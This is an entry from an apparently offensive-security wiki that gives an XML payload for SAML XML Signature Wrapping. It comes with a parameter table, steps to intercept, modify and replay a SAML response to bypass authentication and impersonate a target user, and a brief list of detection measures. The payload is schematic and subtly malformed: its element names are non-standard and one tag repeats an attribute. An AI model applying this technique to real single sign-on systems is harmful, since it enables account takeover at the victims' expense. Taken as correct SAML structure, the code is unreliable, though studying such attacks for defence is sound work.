---
id: 754cb343-b950-4752-ba7d-2fcfbcc78c24
name: SAML-XML-Signature-Wrapping-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:32.162382+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - saml
  - xml
  - payload
validated: true
---

# SAML-XML-Signature-Wrapping-Payload

## Code

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

## Description

This XML payload demonstrates XML Signature Wrapping in a SAML response. It injects an unauthorized assertion (<FA ID="evil">) for the attacker alongside the legitimate assertion (<LA>), allowing the signature to validate on the legitimate part while the parser may process the injected assertion if validation is flawed.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ID="evil" | Unique ID for the injected attacker assertion | evil or custom attacker ID |
| <Subject>Attacker</Subject> | Injected subject name for impersonation | Attacker or target username |
| ID="legitimate" | ID of the preserved legitimate assertion | legitimate or original ID |
| <Subject>Legitimate User</Subject> | Original legitimate user subject | Actual user from intercepted response |
| Reference URI="legitimate" | Signature reference to the legitimate assertion only | legitimate or original URI |

## Usage

Intercept a legitimate SAMLResponse during SSO flow using a proxy like [[tools/Burp-Suite]], decode it, replace the assertion section with this wrapped structure (preserving the original signature on <LA>), re-encode to base64, and replay via [[commands/curl-post-modified-saml-response]]. This is used in procedures like [[procedures/SAML-Injection-with-XML-Signature-Wrapping]] to bypass authentication.

## Detection

- Log and validate all SAML responses for multiple assertions or signatures.
- Implement XPath or schema validation to reject extraneous elements.
- Monitor for authentication events with mismatched user attributes or unexpected assertion counts.
- Network IDS signatures for base64-decoded SAML XML containing duplicate IDs.

## Related

- [[procedures/SAML-Injection-with-XML-Signature-Wrapping]]
- [[tools/Burp-Suite]]
